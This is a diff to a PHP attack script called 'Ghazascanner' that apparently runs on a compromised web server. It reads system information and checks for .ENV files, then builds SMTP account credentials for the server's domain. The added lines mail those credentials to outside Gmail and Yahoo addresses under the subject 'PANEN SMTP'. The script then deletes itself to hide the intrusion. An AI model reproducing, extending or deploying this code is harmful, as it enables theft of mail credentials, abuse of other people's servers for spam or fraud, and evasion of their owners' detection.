@@ -1,3 +1,4 @@
+<center>
 <?php
 echo '<title>Ghazascanner</title>';
 echo '<center><h1>Ghazascanner@_2020runbot</h1>'.'<br>'.'[uname] '.php_uname().' [/uname]<br>';
@@ -57,6 +58,21 @@ echo ".ENV FAIL" ;
 }
 
 
+$kirim = '
+
+       SMTP AUTO CREATE
+	   
+'.$t.'|25|'.$e.'@'.$t.'|'.$password.'
+--------------------------------------------
+'.$parm.'|infos@'.$t.'|' .$peli.'
+'.$parm.'|hussam@'.$t.'|' .$peli.'
+'.$parm.'|abi_layla@'.$t.'|' .$peli.'
+'.$parm.'|accountmu@'.$t.'|' .$peli.'
+'.$parm.'|adminustratro@'.$t.'|' .$peli.'
+'.$parm.'|salesman@'.$t.'|' .$peli.'
+
+
+';
 $cekrek ='
 [smtp]'.$parm.'|infos@'.$t.'|' .$peli.'[/smtp]
 [smtp]'.$parm.'|hussam@'.$t.'|' .$peli.'[/smtp]
@@ -66,5 +82,10 @@ $cekrek ='
 [smtp]'.$parm.'|salesman@'.$t.'|' .$peli.'[/smtp]
 ';
 echo $cekrek;
-
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'sitexploit@gmail.com,buzashop1998@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$from = "From: Result<botv3@mrspybotv3.com";
+mail($tujuanmail, "PANEN SMTP", $kirim, $from);
+@unlink(__FILE__);
 ?>
